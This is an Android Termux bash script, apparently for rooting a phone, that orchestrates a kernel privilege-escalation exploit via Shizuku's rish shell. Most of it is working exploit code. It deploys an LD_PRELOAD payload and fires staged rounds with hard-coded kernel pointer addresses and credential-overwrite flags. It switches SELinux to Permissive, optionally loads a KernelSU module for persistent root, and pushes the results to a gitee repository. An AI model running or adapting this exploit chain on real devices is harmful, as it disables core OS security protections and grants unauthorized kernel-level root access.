#!/data/data/com.termux/files/usr/bin/bash
# ============================================================
# matisse KSU 持久化脚本 v7 (2026-09-10 helmsman, 基于 v6 照搬)
# 一行: bash ~/ksu_persist.sh [每boot R掷数=6]
# v7: 弹药 mt85->mt87(毒链自清); KO 可选武装(=bin/ksu/kernelsu_gki209_v2.ko，须显式授权);
#     R 轮 env 预开 PSELECT_KO(A1修复); 同boot R 重掷循环; E5 gate(E5a->E5b);
#     成功=内核模块留存(软重启不丢), 硬重启后需再次显式授权后重跑。
# 用法: `bash ~/ksu_persist.sh`                 — 默认无 KO (仅取 C 落地证据)
#       `HUNT_ALLOW_KO=1 bash ~/ksu_persist.sh` — 装填 KO (需用户明确授权!!)
# 序列: 部署(SHA门) → 取证 → 体检(load门15) → R → E5v3 → C → E5R → 回收回传
# 判据: ksu_done.txt / root_alive.txt / uname -n=glroot / ROOT-SEEN euid=0
# v6 修复 (审计详情见 REVIEW_2026-09-07_hunt_audit.md):
#   1. fire() C 轮 PSELECT_TASK 原追加在 `> ... 2>&1` 之后 → 成为 sleep 的
#      argv 而非环境变量 → `sleep: invalid time interval` → C 轮 100% 空转
#      (沙盒实测复现)。修: 并入 env 块 (run_c_strike.sh line 58 同款)。
#   2. E5→C 间 child 心跳新鲜度校验 (mt86 纪律移植, c-strike 有而 hunt 漏)。
#   3. load>15 铁律门 (原"仅记录"不拦截, 违反 09-06 软重启教训)。
#   4. KO 推送结果检查 (原 rpush 静默失败) + HUNT_ALLOW_KO 授权门
#      (既定用户规则: insmod/KSU 需另行授权, 脚本级强制)。
# ============================================================
set -u
# 默认不武装 KO；只有调用方显式设置 HUNT_ALLOW_KO=1 才允许加载。
: "${HUNT_ALLOW_KO:=0}"
TOKEN=$(cat "$HOME/.matisse_token" 2>/dev/null | tr -d ' \r\n' || true)
REPO_URL="https://ihamn:${TOKEN}@gitee.com/ihamn/matisse.git"
[ -n "$TOKEN" ] || REPO_URL="https://gitee.com/ihamn/matisse.git"
WORK="$HOME/matisse"
RUN_TS=$(date +%Y%m%d_%H%M%S)
CONSOLE_LOG="$HOME/ksu_console_${RUN_TS}.log"
PUSHED=0; EXTRA=""
command -v termux-wake-lock >/dev/null 2>&1 && termux-wake-lock 2>/dev/null
exec > >(tee -a "$CONSOLE_LOG") 2>&1
say(){ echo "[hunt] $*"; }
SHIZUKU_HINT="!! Shizuku 连接不稳: 设置->应用->Termux和Shizuku->省电策略[无限制], 插电+亮屏, 重跑本脚本"

# ── 0. git/仓库 ──
say "第0步: 仓库"
command -v git >/dev/null 2>&1 || pkg install -y git >/dev/null 2>&1
[ -d "$WORK/.git" ] || git clone -q "$REPO_URL" "$WORK" || { say "克隆失败"; exit 1; }
cd "$WORK" || exit 1
git config user.name "field-termux"; git config user.email "field@termux.local"
git pull -q --rebase origin master 2>/dev/null || true
say "仓库: $(git log --oneline -1 | cut -c1-60)"

# ── 1. rish 探测 + 模式 + 重试封装 ──
say "第1步: rish"
RISH=""
for c in "$HOME/rish" "$HOME/rish/rish" "/sdcard/Download/rish" "/storage/emulated/0/Download/rish" "/data/local/tmp/rish"; do
  [ -f "$c" ] && RISH="$c" && break
done
[ -z "$RISH" ] && RISH=$(find "$HOME" -maxdepth 3 -name rish -type f 2>/dev/null | head -1)
[ -z "$RISH" ] && { say "!! 没找到 rish (Shizuku app→复制 rish→~/)"; exit 2; }
RISH_DIR=$(dirname "$RISH"); chmod +x "$RISH" 2>/dev/null
RISH_MODE=""; TEST_A=$( (cd "$RISH_DIR" && timeout 30 ./rish "echo RISH_OK_$(id -u)") 2>&1 )
printf '%s' "$TEST_A" | grep -q "RISH_OK_" && RISH_MODE=args && RISH_OUT="$TEST_A"
if [ -z "$RISH_MODE" ]; then
  TEST_B=$( (cd "$RISH_DIR" && echo 'echo RISH_OK_$(id -u)' | timeout 30 ./rish) 2>&1 )
  printf '%s' "$TEST_B" | grep -q "RISH_OK_" && RISH_MODE=stdin && RISH_OUT="$TEST_B"
fi
[ -z "$RISH_MODE" ] && { say "!! rish 不可用 (Shizuku 没在运行?) 输出: $TEST_A"; exit 2; }
say "rish 模式=$RISH_MODE 身份: $(printf '%s' "$RISH_OUT" | tr '\n' ' ')"
rsh1(){ local cmd="$1" t="${2:-60}"
  if [ "$RISH_MODE" = args ]; then (cd "$RISH_DIR" && timeout "$t" ./rish "$cmd") 2>&1
  else printf '%s\n' "$cmd" | (cd "$RISH_DIR" && timeout "$t" ./rish) 2>&1; fi; }
rsh(){ local cmd="$1" t="${2:-60}" out i
  for i in 1 2 3 4; do
    out=$(rsh1 "$cmd" "$t")
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "Shizuku 闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }
rpush(){ local l="$1" r="$2" out i
  for i in 1 2 3 4; do
    if [ "$RISH_MODE" = args ]; then out=$( (cd "$RISH_DIR" && timeout 180 ./rish "cat > '$r'") < "$l" 2>&1 )
    else out=$( { echo "cat > '$r'"; cat "$l"; } | (cd "$RISH_DIR" && timeout 180 ./rish) 2>&1 ); fi
    printf '%s' "$out" | grep -q "Request timeout\|blocked by your system" || { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 4 ] && say "推送闪断(第${i}次), 8s 重试..." >&2
    sleep 8
  done; printf '%s\n' "$out"; return 1; }

# ── 2. 部署 mt87 (SHA 门) + GKI KernelSU 模块 ──
say "第2步: 部署 mt87 + GKI kernelsu.ko"
[ -f "$WORK/bin/mt87/preload.so" ] || { say "!! 无 bin/mt87/preload.so"; exit 3; }
SHA_EXP=$(grep -ao '[0-9a-f]\{64\}' "$WORK/bin/mt87/BUILD_INFO.txt" 2>/dev/null | head -1)
rpush "$WORK/bin/mt87/preload.so" "/data/local/tmp/preload.new" >/dev/null
rsh "mv -f /data/local/tmp/preload.new /data/local/tmp/preload.so; chmod 644 /data/local/tmp/preload.so" 30 >/dev/null
# KO 装填：默认关闭；HUNT_ALLOW_KO=1 显式授权后仍须通过本地/远端 SHA-256 门。
KOV=""
if [ "${HUNT_ALLOW_KO:-0}" = "1" ]; then
  if [ -f "$WORK/bin/ksu/kernelsu_gki209_v2.ko" ]; then
    rpush "$WORK/bin/ksu/kernelsu_gki209_v2.ko" "/data/local/tmp/kernelsu_gki209.ko" >/dev/null \
      || say "!! KO 推送失败 (rish 闪断) — C 轮将无 KO"
    rsh "chmod 644 /data/local/tmp/kernelsu_gki209.ko" 20 >/dev/null
    SHA_KO_EXPECTED=$(sha256sum "$WORK/bin/ksu/kernelsu_gki209_v2.ko" | awk '{print $1}')
    SHA_KO_GOT=$(rsh "sha256sum /data/local/tmp/kernelsu_gki209.ko 2>/dev/null | awk '{print \$1}'" 30 | tr -d '\r')
    if [ -n "$SHA_KO_EXPECTED" ] && [ "$SHA_KO_GOT" = "$SHA_KO_EXPECTED" ]; then
      KOV="/data/local/tmp/kernelsu_gki209.ko"
      say "KO 已武装且 SHA-256 已验证: ${SHA_KO_GOT:0:16}..."
    else
      say "!! KO SHA-256 不一致/不可读，C 轮将无 KO (expected=${SHA_KO_EXPECTED:0:16}... got=${SHA_KO_GOT:0:16}...)"
    fi
    say "GKI ko: 布局已对齐设备(config 实证), 63导入全导出, 29符号走kprobe resolver(硬失败), CFI桩就位; 加载 flags=3"
  else
    say "!! bin/ksu/kernelsu_gki209_v2.ko 不在本地克隆 (未归档资产) — 无 KO 模式"
  fi
else
  say "HUNT_ALLOW_KO!=1 — C 轮仅取 C 落地证据, 不装填模块"
fi
SHA_GOT=$(rsh "sha256sum /data/local/tmp/preload.so" 30 | tr -d '\r' | awk '{print $1}')
say "SHA 期望=${SHA_EXP:0:16}... 实际=${SHA_GOT:0:16}..."
if [ -n "$SHA_EXP" ] && [ "$SHA_GOT" != "$SHA_EXP" ]; then
  case "$SHA_GOT" in *timeout*|*blocked*) say "$SHIZUKU_DEAD_HINT";; *) say "!! SHA 不一致, 中止";; esac
  exit 3
fi
say "二进制校验通过 (mt87: KO fd 预开 + 20min gate)"

# ── 3. 取证 (零开火): 残留 → 请求重启 ──
say "第3步: 取证"
FORENSIC="$WORK/logs_raw/hunt_forensic_${RUN_TS}.txt"
{ rsh "date; cat /proc/sys/kernel/random/boot_id; getenforce; cat /proc/loadavg; cat /proc/uptime"
  echo "--- residue ---"
  rsh 'for p in $(pgrep -x sleep 2>/dev/null); do echo "== pid $p =="; for t in /proc/$p/task/*; do echo "tid=$(basename $t) st=$(cut -d" " -f3 $t/stat 2>/dev/null) wchan=$(cat $t/wchan 2>/dev/null)"; done; done' 60
} > "$FORENSIC" 2>&1
RES=$(grep -c "tid=" "$FORENSIC" 2>/dev/null); STUCK=$(grep -o "state=[DR]" "$FORENSIC" 2>/dev/null | wc -l)
say "取证: 线程=$RES D/R=$STUCK"
if [ "${RES:-0}" -gt 0 ]; then
  say "!! 有残留进程 (D/R=$STUCK) — 请重启手机, 10 分钟后重跑本脚本"
  cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
  git add -A >/dev/null 2>&1; git commit -q -m "hunt forensics ${RUN_TS}: residue threads=$RES D/R=$STUCK - reboot requested" >/dev/null 2>&1 || true
  for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && break; sleep 10; done
  exit 5
fi
say "无残留, 继续"

# ── 4. 体检 ──
say "第4步: 体检"
BOOT0=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r')
printf '%s' "$BOOT0" | grep -qE '^[0-9a-f]{8}-' || { say "!! BOOT0 非 UUID: Shizuku 不稳, 停"; exit 4; }
ENF0=$(rsh "getenforce" 20 | tr -d '\r')
[ "$ENF0" = "Enforcing" ] || { say "!! enforce=$ENF0 非预期"; exit 4; }
while :; do
  UP=$(rsh "awk '{print int(\$1)}' /proc/uptime" 20 | tr -d '\r')
  case "$UP" in ''|*[!0-9]*) sleep 10; continue;; esac
  [ "$UP" -ge 600 ] && break
  say "开机仅 ${UP}s, settle..."; sleep 100
done
LOAD0=$(rsh "cat /proc/loadavg" 20 | tr -d '\r')
LOAD_INT=${LOAD0%%.*}
case "$LOAD_INT" in ''|*[!0-9]*) LOAD_INT=99;; esac
if [ "$LOAD_INT" -gt 15 ]; then
  say "!! load=$LOAD0 > 15 铁律 (09-06 软重启教训, load16.7) — 不开火, 稍后重跑"
  exit 6
fi
say "体检 OK: boot=$(printf '%s' "$BOOT0" | cut -c1-8) enforce=$ENF0 load=$LOAD0"

# v7.1: Shizuku 抗冻加固 (best-effort)
rsh "svc power stayon ac 2>/dev/null; svc power stayon true 2>/dev/null" 20 >/dev/null 2>&1
rsh "cmd appops set moe.shizuku.privileged.api RUN_IN_BACKGROUND allow 2>/dev/null; cmd appops set com.termux RUN_IN_BACKGROUND allow 2>/dev/null; dumpsys deviceidle whitelist +moe.shizuku.privileged.api 2>/dev/null" 30 >/dev/null 2>&1
say "坚化: stayon+appops 已尝试"

# ── 5. 开火机器 ──
cleangate(){ local i
  for i in 1 2 3 4; do
    rsh "pkill -9 -x sleep 2>/dev/null; rm -f /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt /data/local/tmp/ksu_done.txt" 20 >/dev/null
    GONE=$(rsh "ls /data/local/tmp/mt49_child_status.txt /data/local/tmp/root_alive.txt 2>/dev/null | wc -l" 20 | tr -d '\r ')
    [ "$GONE" = "0" ] && return 0
    say "门槛文件未删净, 重试 $i..."
  done; return 1; }
fire(){
  local name="$1" kind="$2" task="$3" te="" cmd tskenv koflag
  # v6 关键修复: PSELECT_TASK/PSELECT_KO 必须在 env 块内 (重定向前)。
  # 原版追加在 `> $name.out 2>&1` 之后 → 成为 sleep 的 argv → 触发器 100% 不运行。
  tskenv=""; [ -n "$task" ] && tskenv="PSELECT_TASK=$task"
  koflag=""; [ -n "$KOV" ] && koflag="PSELECT_KO=$KOV"
  case "$kind" in
    R)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=R PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 $koflag LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    E5) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    C)  cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_PTR_MODE=1 PSELECT_PTR_STAGE=C PSELECT_PTR_STRICT=1 PSELECT_PTR_RIGHT=ffffff80027b0ae0 $tskenv $koflag PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
    E5R) cmd="timeout 250 env PSELECT_SLIDE_TRIGGER=1 PSELECT_CRED=1 PSELECT_PERF_CRED=1 PSELECT_RETRY=1 PSELECT_SELINUX_ENF=1 PSELECT_SELINUX_ENF_VALUE=SPRAY1 PSELECT_CONSUMER_CPU=6 PSELECT_SKIP_WARMUP=1 PSELECT_WAIT_SECONDS=200 PSELECT_WAITER_WAKE_SECONDS=3 PSELECT_WINDOW_SECONDS=20 PSELECT_NO_CANARY=1 LD_PRELOAD=/data/local/tmp/preload.so /system/bin/sleep 180 > /data/local/tmp/$name.out 2>&1" ;;
  esac
  say "开火 $name (约4-5分钟, 勿动手机, 保持亮屏)..."
  rsh1 "$cmd" 280 | grep -a "RC=" | tail -1
  local ef
  ef=$(rsh "getenforce" 20 | tr -d '\r')
  say "$name 完成 enforce=$ef"
}
hb_fresh(){ local now mt age
  now=$(rsh "date +%s" 20 | tr -d '\r'); mt=$(rsh "stat -c %Y /data/local/tmp/mt49_child_status.txt" 20 | tr -d '\r')
  case "$now$mt" in ''|*[!0-9]*) return 1;; esac
  age=$((now-mt))
  [ "$age" -le 30 ] && return 0
  say "!! child 心跳陈旧: ${age}s (child 死亡/致盲?)"
  return 1; }
gate(){ local st; st=$(rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r')
  printf '%s' "$st" | grep -q "CapEff=0000000000000000" && { echo "R_MISS"; return; }
  printf '%s' "$st" | grep -q "task=" && { echo "R_LANDED"; return; }
  echo "R_MISS"; }
gettask(){ rsh "cat /data/local/tmp/mt49_child_status.txt" 30 | tr -d '\r' | grep -a '^task=' | tail -1 | cut -d= -f2 | cut -d' ' -f1; }
bootid(){ local out i
  for i in 1 2 3; do
    out=$(rsh "cat /proc/sys/kernel/random/boot_id" 20 | tr -d '\r' | grep -aE '^[0-9a-f]{8}-' | head -1)
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
    [ "$i" -lt 3 ] && sleep 8
  done; echo "READ_FAIL"; return 1; }

# ── 5b. v7: R 重掷(同boot, mt87毒链自清) → E5 gate → C(KO) → E5R ──
cleangate || { say "!! 门槛清理失败, 停"; exit 5; }
if [ $# -ge 1 ]; then RMAX=$1; else RMAX=6; fi
RLAND=0; TASK=""; LNAME=""
for ((rr=1; rr<=RMAX; rr++)); do
  say "R 掷 $rr/$RMAX (同boot连打, mt87 每轮毒链自清)..."
  cleangate || true
  fire R$rr R ""
  G=$(gate)
  say "R$rr: $G"
  B2=$(bootid)
  if [ "$G" = "R_LANDED" ] && [ "$B2" = "$BOOT0" ]; then
    RLAND=1; TASK=$(gettask); LNAME="R$rr"
    say "R 落地 task=$TASK (round=$LNAME)"
    break
  fi
  say "R$rr miss/无效 - sleep 20s 后同boot重掷"
  sleep 20
done
if [ "$RLAND" != "1" ]; then
  say "!! 本 boot $RMAX 发 R 全 miss (命中率10-25%) - 重启手机后重跑: bash ~/ksu_persist.sh"
  exit 5
fi
R11_GATE=R_LANDED
E5OK=0
for e in a b c d e; do
  say "E5$e permissive 开窗..."
  fire E5$e E5 ""
  EF=$(rsh 'getenforce' 20 | tr -d '\r')
  say "E5$e 后 enforce=$EF"
  if [ "$EF" = "Permissive" ]; then E5OK=1; break; fi
  if printf '%s' "$EF" | grep -q "Server is not running\|timeout"; then
    say "!! rish 掉线 - 等 Shizuku 回来(最多6分钟)..."
    for w2 in 1 2 3 4 5 6 7 8 9 10 11 12; do sleep 30
      OK2=$(rsh 'id -u' 15 | tr -d '\r \n')
      [ "$OK2" = "2000" ] && { say "rish 恢复, 续试 E5"; break; }
    done
  fi
done
if [ "$E5OK" != "1" ]; then
  say "!! E5 两发未翻 Permissive - 重启手机后重跑"
  exit 7
fi
C_FIRED=0
if hb_fresh; then
  say "C 击 task=$TASK (KO=gki209 预开fd, R-child 自动 finit)..."
  fire C1 C "$TASK"
  C_FIRED=1
  KMOD=0
  for ((w=0; w<44; w++)); do
    sleep 5
    KMOD=$(rsh "grep -c ^ksu /proc/modules 2>/dev/null" 20 | tr -d '
 ')
    [ "$KMOD" -ge 1 ] && { say "KSU 模块已装入 /proc/modules"; break; }
    RA=$(rsh "cat /data/local/tmp/root_alive.txt 2>/dev/null | head -1" 20 | tr -d '
')
    if [ -n "$RA" ]; then say "C 落地 root_alive=[$RA] (等 R-child finit...)"; fi
    RS=$(rsh "tail -c 120000 /data/local/tmp/$LNAME.out 2>/dev/null | grep -a 'ROOT-SEN\|after setres\|finit_module.*OK' | tail -2" 20 | tr -d '
')
    [ -n "$RS" ] && say "R-child: $RS"
  done
  say "模块检查: ksu=$KMOD"
else
  say "!! child 心跳陈旧 - C 不击 (mt86 纪律)"
  KMOD=0
fi
EFN=$(rsh 'getenforce' 20 | tr -d '
')
if [ "$EFN" = "Permissive" ]; then
  say "E5R 还原 enforcing..."
  fire E5R1 E5R ""
  say "E5R: enforce=$(rsh 'getenforce' 20 | tr -d '
')"
fi
KSU_FINAL=$(rsh "grep -c ^ksu /proc/modules 2>/dev/null" 20 | tr -d '
 ')
if [ "$KSU_FINAL" -ge 1 ]; then
  say ""
  say "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
  say "★ KSU 已装入内核 (/proc/modules: ksu) - 管理器 v0.9.5 转绿, su 可用 ★"
  say "★ 持久化: 软重启/不重启均保留(内核态模块); 硬重启后重跑本脚本即自动重装 ★"
  say "★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★★"
  EXTRA="KSU_LOADED"
else
  say "!! KSU 未装入 (C轮模块=$KMOD). 重启手机后重跑: bash ~/ksu_persist.sh 继续掷"
  EXTRA="KSU_MISS"
fi
# ── 6. 回收 + 判据 + 回传 ──
say "第6步: 回收"
mkdir -p "$WORK/logs_raw/ksu_hunt_$RUN_TS"
for n in R1 R2 R3 R4 R5 R6 E5a E5b C1 E5R1; do
  rsh "cat /data/local/tmp/$n.out" 90 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" 2>/dev/null
  [ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out" ] || rm -f "$WORK/logs_raw/ksu_hunt_$RUN_TS/${n}_raw.out"
done
rsh "cat /data/local/tmp/root_alive.txt" 20 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/root_alive.txt" 2>/dev/null
rsh "cat /data/local/tmp/ksu_done.txt" 20 > "$WORK/logs_raw/ksu_hunt_$RUN_TS/ksu_done.txt" 2>/dev/null
KSU_MOD=$(rsh "grep -c ksu /proc/modules" 20 | tr -d '\r ')
ROOT_ALIVE=$([ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/root_alive.txt" ] && echo YES || echo no)
KSU_DONE=$([ -s "$WORK/logs_raw/ksu_hunt_$RUN_TS/ksu_done.txt" ] && echo YES || echo no)
HN=$(rsh "uname -n" 20 | tr -d '\r')
ROOT_SEEN=$(grep -ah "ROOT-SEEN.*euid=0" "$WORK/logs_raw/ksu_hunt_$RUN_TS/"*.out 2>/dev/null | head -1)
{ echo "# KSU HUNT 卡 ${RUN_TS}"
  echo "- R11: $R11_GATE / C: $C_FIRED / $EXTRA"
  echo "- 判据: ksu模块=$KSU_MOD root_alive=$ROOT_ALIVE ksu_done=$KSU_DONE hostname=$HN"
  echo "- ROOT-SEEN euid=0: ${ROOT_SEEN:-无}"
  echo "- 终局活体: $(rsh 'getenforce; uname -n' 20 | tr -d '\r' | tr '\n' ' ')"
} > "$WORK/logs_raw/ksu_hunt_$RUN_TS/CARD.md"
cp "$CONSOLE_LOG" "$WORK/logs_raw/ksu_console_${RUN_TS}.log" 2>/dev/null
git add -A >/dev/null 2>&1
git commit -q -m "KSU hunt ${RUN_TS}: R11=$R11_GATE C=$C_FIRED ksu_mod=$KSU_MOD root_alive=$ROOT_ALIVE ksu_done=$KSU_DONE host=$HN" || true
for i in 1 2 3; do git pull -q --rebase origin master 2>/dev/null; git push -q origin master 2>/dev/null && { PUSHED=1; break; }; sleep 10; done
command -v termux-wake-unlock >/dev/null 2>&1 && termux-wake-unlock 2>/dev/null
say "=========================================="
say "终局: R11=$R11_GATE | C=$C_FIRED | ksu模块=$KSU_MOD | root_alive=$ROOT_ALIVE | ksu_done=$KSU_DONE | host=$HN"
[ "$KSU_MOD" -ge 1 ] 2>/dev/null && say "★★★ KSU 持久 root 完成 ★★★"
[ "$ROOT_ALIVE" = "YES" ] && say "★★★ ROOT-ALIVE 证据落盘 ★★★"
[ "$PUSHED" = 1 ] && say "全部数据已推回 gitee" || say "推送失败! 发 $CONSOLE_LOG 给分析侧"
